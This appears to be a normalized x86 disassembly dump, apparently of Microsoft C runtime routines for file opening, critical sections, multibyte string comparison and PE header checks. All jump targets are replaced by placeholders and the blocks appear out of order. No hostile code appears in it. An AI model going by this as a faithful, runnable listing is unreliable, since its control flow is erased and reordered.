mov al 0x30
dec ebx
call sub_40de03
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_40c2b0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x260 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] esi
je r-xdata
test ebx ebx
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x224 ]
call sub_40de5c
pop ecx
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx edi
mov al 0x20
dec ebx
call sub_40de03
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x270 ]
push eax
dec ebx
add esi 0x2
call sub_40c490
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x21c ]
mov ecx [ ebp - 0x21c ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_40eaa0
push 0x10
push r--data
call sub_408380
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40eb33
mov eax [ ebp - 0x1c ]
call sub_4083c5
retn
mov esi edi
mov eax [ rwxdata ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rwxdata ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_40613e
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rwxdata ]
push [ eax + esi * 4 ]
call sub_409812
pop ecx
mov eax [ rwxdata ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_40eb3c
mov edi edi
push esi
push edi
xor esi esi
mov edi rwxdata
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rwxdata ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rwxdata ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rwxdata ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_40ec0c
push 0xc
push r--data
call sub_408380
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rwxdata ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rwxdata ]
cmp [ esi ] ebx
je r-xdata
call sub_40a703
push 0x1e
call sub_40a554
push 0xff
call sub_40a1d0
push 0x18
call sub_40c01b
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_4078ae
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_4083c5
retn
push edi
call sub_409812
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_409812
pop ecx
call sub_4078ae
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ecc5
mov eax [ ebp - 0x1c ]
sub_40ecce
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rwxdata ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_40ec0c
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_40a4ef
sub_40ed01
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
mov esi eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4077b7
int3
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_41450f
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and eax 0x3
sub eax ebx
mov ecx 0xc0000000
mov edx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] edx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x24 ] eax
je r-xdata
mov [ ebp - 0x14 ] ebx
sub eax ecx
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
test [ ebp + 0x10 ] 0x70000
jne r-xdata
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_4078c1
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
call sub_407823
mov eax esi
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
push edi
mov edi 0x100
cmp eax ecx
jg r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rwxdata ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
cmp eax edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
test eax 0x1000
je r-xdata
or [ ebp - 0x10 ] 0x4000000
or [ ebp - 0xc ] 0x10000
or [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] 0x1
call sub_4078c1
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
call sub_407823
mov eax esi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0xc ] edx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0x10 ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0x10 ] 0x8000000
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
call sub_410021
or ebx 0xffffffff
mov [ esi ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x10 ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push 0x0
push [ ebp - 0x10 ]
mov [ eax ] 0x1
push [ ebp - 0x18 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_4078c1
and [ eax ] 0x0
mov [ esi ] ebx
call sub_4078ae
mov [ eax ] 0x18
call sub_4078ae
mov eax [ eax ]
jmp r-xdata
push [ ebp - 0x20 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
pop edi
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_4078d4
pop ecx
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_4078d4
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_4078ae
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4078ae
mov [ eax ] 0xd
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x7fffffff
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x20 ]
push [ esi ]
call sub_40fdeb
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rwxdata ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rwxdata ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] 0x0
mov [ eax ] cl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x24 ]
and eax edi
jne r-xdata
push 0x2
push ebx
push [ esi ]
call sub_4096c9
mov edi eax
add esp 0xc
cmp edi ebx
jne r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] 0x0
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] 0x0
call sub_4104bc
add esp 0xc
test eax eax
jne r-xdata
call sub_4078c1
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
and eax 0x7fffffff
push eax
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax ebx
jne r-xdata
xor edi edi
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push 0x0
push 0x0
push [ esi ]
call sub_4096c9
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_40984c
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_4078d4
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_40fe6c
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax edi
cdq
push edx
push eax
push [ esi ]
call sub_414159
add esp 0xc
cmp eax ebx
je r-xdata
pop ecx
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x1c ]
push eax
push [ esi ]
call sub_4104bc
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x1c ] rwxdata
push 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_40b354
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp ebx edi
jg r-xdata
mov [ ebp - 0x1c ] 0xfeff
push 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_40b354
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_40984c
pop ecx
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push edi
push edi
push [ esi ]
call sub_4096c9
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1c ] rwxdata
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax ebx
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
push [ esi ]
call sub_408def
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or ebx 0xffffffff
pop ebx
jmp r-xdata
push edi
push 0x2
push [ esi ]
call sub_4096c9
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_40b354
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_40b354
and eax edx
add esp 0x10
cmp eax ebx
je r-xdata
sub_40f435
push 0x14
push r--data
call sub_408380
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x20 ] edi
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
jne r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
call sub_40ed01
add esp 0x14
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f4a9
mov esi [ ebp - 0x24 ]
cmp esi edi
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
mov eax [ ebp - 0x1c ]
call sub_4078ae
mov [ eax ] esi
jmp r-xdata
call sub_4083c5
retn
or eax 0xffffffff
jmp r-xdata
sub_40f4a9
cmp [ ebp - 0x20 ] edi
je r-xdata
retn
cmp [ ebp - 0x24 ] edi
je r-xdata
push [ ebp - 0x1c ]
call sub_40fffa
pop ecx
mov eax [ ebp - 0x1c ]
sar eax 0x5
mov ecx [ ebp - 0x1c ]
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + ecx + 0x4 ]
and [ eax ] 0xfe
sub_40f4e3
push 0x14
push r--data
call sub_408380
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x18 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
je r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
call sub_407823
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
call sub_4083c5
retn
mov [ ebp - 0x4 ] edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
call sub_40ed01
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f579
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ esi ] 0xffffffff
sub_40f579
cmp [ ebp - 0x1c ] edi
je r-xdata
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ esi ]
call sub_40fffa
pop ecx
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rwxdata ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_40f5a7
mov edi edi
push ebp
mov ebp esp
push ecx
or [ ebp - 0x4 ] 0xffffffff
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f4e3
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
or eax 0xffffffff
leave
retn
sub_40f5d9
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40f4e3
add esp 0x18
pop ebp
retn
sub_40f5f9
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_406900
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_414709
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx edx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
mov si bx
jmp r-xdata
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx edx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx ecx [ edi ]
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx ecx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_40f817
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_406900
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41475c
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
movzx ecx [ ebx ]
dec [ ebp + 0x10 ]
movzx eax cl
inc ebx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ esi ]
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test cx cx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx eax al
or cx ax
movzx ecx cx
inc ebx
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
shl eax 0x8
movzx edx dl
or ax dx
movzx eax ax
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40f980
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_40f9c0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40fa10
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_408410
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rwxdata ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_40f980
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_40f9c0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fad0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40faf0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_405894
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_40fb35
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
